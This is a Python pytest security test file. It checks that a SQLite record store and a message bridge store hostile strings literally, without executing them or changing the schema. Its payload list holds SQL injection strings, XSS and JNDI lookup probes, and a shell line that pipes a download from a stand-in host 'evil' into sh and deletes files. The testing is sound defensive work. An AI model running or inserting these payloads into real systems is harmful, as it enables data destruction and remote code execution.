"""Wave 6 SEC-001: SQL/control-like payloads are only data (real SQLite store, normal API, no execution hook)."""
import json
import os
import sqlite3
import subprocess
import tempfile
from contextlib import closing
from pathlib import Path

import pytest
from hypothesis import HealthCheck, given, settings, strategies as st

from tests.m1.bridge_helpers import records, sql
from tests.m1.control_helpers import ctl, running
from tests.m1.fakes import FakeRuntimeTarget
from tests.m1.harness.bridge import BridgeHarness
from tests.m1.harness.core import CoreHarness
from tests.m1.helpers import req

pytestmark = [pytest.mark.security, pytest.mark.sqlite]

HOSTILE = [
    "'); DROP TABLE records; --",
    "x'; DELETE FROM peers; INSERT INTO streams VALUES ('evil','t','OPEN',1,'{}','now'); --",
    "\"; ATTACH DATABASE 'evil.db' AS e; --",
    "1; PRAGMA writable_schema=ON; UPDATE sqlite_master SET sql=''; --",
    "CREATE TRIGGER t AFTER INSERT ON records BEGIN DELETE FROM records; END;",
    "$(rm -rf /) `curl evil | sh` ; && | cmd /c del *.*",
    "<script>alert(1)</script><img src=x onerror=alert(2)>&amp; ${jndi:ldap://x} {{7*7}} %s %n ‮",
    "control.cancel", '{"kind": "control.cancel", "decision": "RETRY", "delivery_id": "d"}',
    "line1\nline2\r\n\ttabs 'single' \"double\" \\ back\\slash",
]


def schema_rows(db):
    with closing(sqlite3.connect(db)) as c:
        return c.execute("SELECT type, name, tbl_name, sql FROM sqlite_master ORDER BY type, name").fetchall()


@pytest.fixture
def exec_traps(monkeypatch):
    calls = []

    def trap(name):
        def f(*a, **k):
            calls.append(name)
            raise AssertionError(f"{name} invoked")
        return f

    for mod, name in ((os, "system"), (os, "popen"), (subprocess, "Popen"), (subprocess, "run")):
        monkeypatch.setattr(mod, name, trap(name))
    return calls


@pytest.mark.m1_id("SEC-001")
@pytest.mark.parametrize("text", HOSTILE)
def test_sec_001_payload_round_trips_literally_and_schema_is_intact(tmp_path, exec_traps, text):
    h = CoreHarness(tmp_path / "ws")
    h.create_peer({"peer_id": text + "-peer", "display_name": text, "adapter_ref": text, "metadata": {"note": text, "n": [text, {"k": text}]}})
    h.create_peer({"peer_id": "b"})
    h.create_stream({"stream_id": text + "-stream", "title": text, "members": [text + "-peer", "b"], "metadata": {"t": text}})
    schema, counts = schema_rows(h.db_path), h.row_counts()
    request = req(body={"text": text, "list": [text]}, key=text, author=text + "-peer", stream=text + "-stream", metadata={"m": text}, targets=["b"])
    rec = h.append_record(request)
    assert schema_rows(h.db_path) == schema  # DDL untouched: no table/trigger/index created or dropped
    after = h.row_counts()
    assert {t: after[t] - counts[t] for t in after} == {"peers": 0, "streams": 0, "stream_members": 0, "records": 1, "offsets": 0}
    row = sql(h, "SELECT body_json, metadata_json, idempotency_key, author_peer_id, stream_id FROM records")[0]
    assert json.loads(row[0]) == {"text": text, "list": [text]} and json.loads(row[1]) == {"m": text}  # literal, via raw SQL
    assert row[2:] == (text, text + "-peer", text + "-stream")
    back = h.read_records(text + "-stream")[0]
    assert back.record_id == rec.record_id and back.body == {"text": text, "list": [text]} and back.metadata == {"m": text}
    peer = h.get_peer(text + "-peer")
    assert peer.display_name == text and peer.adapter_ref == text and peer.metadata == {"note": text, "n": [text, {"k": text}]}
    assert h.get_stream(text + "-stream").title == text
    assert h.append_record(request).record_id == rec.record_id  # same literal identity on retry
    assert exec_traps == [] and not Path("evil.db").exists() and not (tmp_path / "evil.db").exists()
    with pytest.raises(AssertionError):  # positive control: a real call IS observed by the trap
        os.system("echo x")
    assert exec_traps == ["system"]


@pytest.mark.m1_id("SEC-001")
@settings(max_examples=60, deadline=None, suppress_health_check=list(HealthCheck))
@given(st.text(alphabet=st.characters(blacklist_categories=("Cs",), blacklist_characters="\x00"), max_size=80),
       st.lists(st.sampled_from(HOSTILE), max_size=3))
def test_sec_001_property_any_text_is_data(text, hostile):
    payload = text + "".join(hostile)
    with tempfile.TemporaryDirectory() as d:
        h = CoreHarness(Path(d) / "ws")
        h.create_peer({"peer_id": "a"})
        h.create_stream({"stream_id": "s", "members": ["a"]})
        schema = schema_rows(h.db_path)
        rec = h.append_record(req(body=payload, key="k", author="a", metadata={"p": payload}))
        assert schema_rows(h.db_path) == schema
        assert sql(h, "SELECT COUNT(*) FROM records") == [(1,)] and sql(h, "SELECT COUNT(*) FROM peers") == [(1,)]
        assert json.loads(sql(h, "SELECT body_json FROM records")[0][0]) == payload  # fails if the store rejects/alters anything
        assert h.read_records("s")[0].record_id == rec.record_id


@pytest.mark.m1_id("SEC-001")
def test_sec_001_control_like_message_bodies_never_trigger_control_or_commands(tmp_path, exec_traps):
    h = BridgeHarness(tmp_path / "ws")
    for p in ("a", "b"):
        h.create_peer({"peer_id": p})
    h.create_stream({"stream_id": "s", "members": ["a", "b"]})
    rt = FakeRuntimeTarget()
    lookalikes = ['{"kind":"control.cancel"}', {"kind": "control.cancel", "decision": "RETRY", "delivery_id": "s:b:x:1"},
                  "control.pause", "'); INSERT INTO bridge_controls VALUES ('x'); --"]
    for i, body in enumerate(lookalikes):
        h.append_record(req(body=body, key=f"m{i}", author="a"))  # kind = message
    assert [h.delivery_cycle("b", "s", rt).status for _ in lookalikes] == ["delivered"] * 4
    assert rt.count("deliver") == 4 and rt.count("interrupt") == rt.count("terminate") == rt.count("steer") == 0  # prompts only
    assert sql(h, "SELECT COUNT(*) FROM bridge_controls") == [(0,)] and sql(h, "SELECT COUNT(*) FROM bridge_reconciliations") == [(0,)]
    assert [json.loads(r[4]) for r in records(h) if r[3] == "message"] == lookalikes  # stored literally
    assert exec_traps == []
    # positive control: the SAME words as a real control Record (kind) DO act
    h2 = BridgeHarness(tmp_path / "ws2")
    for p in ("a", "b"):
        h2.create_peer({"peer_id": p})
    h2.create_stream({"stream_id": "s", "members": ["a", "b"]})
    h2.append_record(req(body="go", key="g", author="a"))
    rt2, _ = running(h2)
    cancel = ctl(h2, "control.cancel", "cx")
    assert h2.handle_control(cancel.record_id, rt2, "b").runtime_outcome == "done" and rt2.count("terminate") == 1
